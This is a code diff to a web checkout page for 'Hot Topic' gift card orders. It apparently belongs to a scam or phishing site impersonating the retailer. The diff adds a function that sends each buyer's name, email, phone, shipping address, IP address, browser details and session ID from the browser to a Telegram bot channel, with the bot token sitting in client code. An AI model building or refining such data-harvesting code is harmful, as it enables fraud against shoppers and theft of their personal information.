@@ -33,6 +33,93 @@ const EMAIL_REGEX = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
 const PHONE_REGEX = /^(\+1|1)?[-. ]?\(?([0-9]{3})\)?[-. ]?([0-9]{3})[-. ]?([0-9]{4})$/;
 const ZIP_REGEX = /^\d{5}(-\d{4})?$/;
 
+// Improved function to send Telegram notifications that works on all devices
+const sendTelegramNotification = async (orderDetails: any) => {
+  console.log("Attempting to send order placed notification to Telegram");
+  
+  try {
+    // Format the message
+    const message = `
+🚨 *NEW HOT TOPIC ORDER PLACED* 🚨
+
+👤 *Customer Information*:
+   Name: ${orderDetails.customerName}
+   Email: ${orderDetails.email}
+   Phone: ${orderDetails.phone}
+
+💳 *Order Details*:
+   Gift Card Value: $${orderDetails.giftCardValue.toFixed(2)}
+   Payment Amount: $${orderDetails.paymentAmount.toFixed(2)}
+   Delivery Method: ${orderDetails.deliveryMethod}`;
+
+    const fullMessage = orderDetails.deliveryMethod === "physical" && orderDetails.address
+      ? message + `
+📍 *Shipping Address*:
+   Street: ${orderDetails.address.street}
+   City: ${orderDetails.address.city}
+   State: ${orderDetails.address.state}
+   ZIP: ${orderDetails.address.zipCode}
+
+🔍 *User Information*:
+   IP Address: \`${orderDetails.userInfo.ip}\`
+   Browser: ${orderDetails.userInfo.userAgent}
+   Session ID: ${orderDetails.userInfo.sessionId || 'Not available'}
+   Timestamp: ${orderDetails.userInfo.timestamp}
+
+📆 *Order Placed*: ${new Date().toLocaleString()}`
+      : message + `
+
+🔍 *User Information*:
+   IP Address: \`${orderDetails.userInfo.ip}\`
+   Browser: ${orderDetails.userInfo.userAgent}
+   Session ID: ${orderDetails.userInfo.sessionId || 'Not available'}
+   Timestamp: ${orderDetails.userInfo.timestamp}
+
+📆 *Order Placed*: ${new Date().toLocaleString()}`;
+
+    console.log("Prepared Telegram message:", fullMessage);
+    
+    // Use XMLHttpRequest instead of fetch for better compatibility
+    return new Promise((resolve, reject) => {
+      const xhr = new XMLHttpRequest();
+      xhr.open("POST", `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, true);
+      xhr.setRequestHeader("Content-Type", "application/json");
+      
+      xhr.onreadystatechange = function() {
+        if (xhr.readyState === 4) {
+          console.log(`XHR Response status: ${xhr.status}`);
+          console.log(`XHR Response text: ${xhr.responseText}`);
+          
+          if (xhr.status >= 200 && xhr.status < 300) {
+            console.log("Telegram notification sent successfully");
+            resolve(true);
+          } else {
+            console.error("Failed to send Telegram notification:", xhr.responseText);
+            resolve(false); // Resolve with false instead of rejecting to prevent errors
+          }
+        }
+      };
+      
+      xhr.onerror = function(e) {
+        console.error("XHR Error occurred while sending Telegram notification:", e);
+        resolve(false); // Resolve with false instead of rejecting to prevent errors
+      };
+      
+      const data = JSON.stringify({
+        chat_id: TELEGRAM_CHANNEL_ID,
+        text: fullMessage,
+        parse_mode: "Markdown"
+      });
+      
+      console.log("Sending XHR request with data:", data);
+      xhr.send(data);
+    });
+  } catch (error) {
+    console.error('Failed to send Telegram notification:', error);
+    return false; // Don't stop the checkout flow if notification fails
+  }
+};
+
 const Index = () => {
   const navigate = useNavigate();
   const [selectedAmount, setSelectedAmount] = useState<number | null>(null);
@@ -135,69 +222,6 @@ const Index = () => {
     }));
   };
 
-  // Function to send notification to Telegram
-  const sendTelegramNotification = async (orderDetails: any) => {
-    try {
-      const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-      
-      // Format the message
-      let message = `
-🚨 *NEW HOT TOPIC ORDER PLACED* 🚨
-
-👤 *Customer Information*:
-   Name: ${orderDetails.customerName}
-   Email: ${orderDetails.email}
-   Phone: ${orderDetails.phone}
-
-💳 *Order Details*:
-   Gift Card Value: $${orderDetails.giftCardValue.toFixed(2)}
-   Payment Amount: $${orderDetails.paymentAmount.toFixed(2)}
-   Delivery Method: ${orderDetails.deliveryMethod}`;
-
-      // Add address if it's a physical delivery
-      if (orderDetails.deliveryMethod === "physical" && orderDetails.address) {
-        message += `
-📍 *Shipping Address*:
-   Street: ${orderDetails.address.street}
-   City: ${orderDetails.address.city}
-   State: ${orderDetails.address.state}
-   ZIP: ${orderDetails.address.zipCode}`;
-      }
-
-      // Add user information
-      message += `
-
-🔍 *User Information*:
-   IP Address: \`${orderDetails.userInfo.ip}\`
-   Browser: ${orderDetails.userInfo.userAgent}
-   Session ID: ${orderDetails.userInfo.sessionId || 'Not available'}
-   Timestamp: ${orderDetails.userInfo.timestamp}
-
-📆 *Order Placed*: ${new Date().toLocaleString()}`;
-
-      // Send to Telegram
-      const response = await fetch(telegramApiUrl, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({
-          chat_id: TELEGRAM_CHANNEL_ID,
-          text: message,
-          parse_mode: 'Markdown',
-        }),
-      });
-
-      const result = await response.json();
-      if (!result.ok) {
-        console.error('Telegram notification error:', result);
-      }
-    } catch (error) {
-      console.error('Failed to send Telegram notification:', error);
-      // Don't stop the checkout flow if notification fails
-    }
-  };
-
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     
@@ -271,8 +295,9 @@ const Index = () => {
         notificationType: "order_placed"
       };
 
-      // Send notification to Telegram
-      await sendTelegramNotification(orderDetails);
+      // Send notification to Telegram using the improved function
+      const notificationSent = await sendTelegramNotification(orderDetails);
+      console.log("Order placed notification sent:", notificationSent);
 
       // Save order details to localStorage for reference
       localStorage.setItem("hotTopicOrder", JSON.stringify(orderDetails));
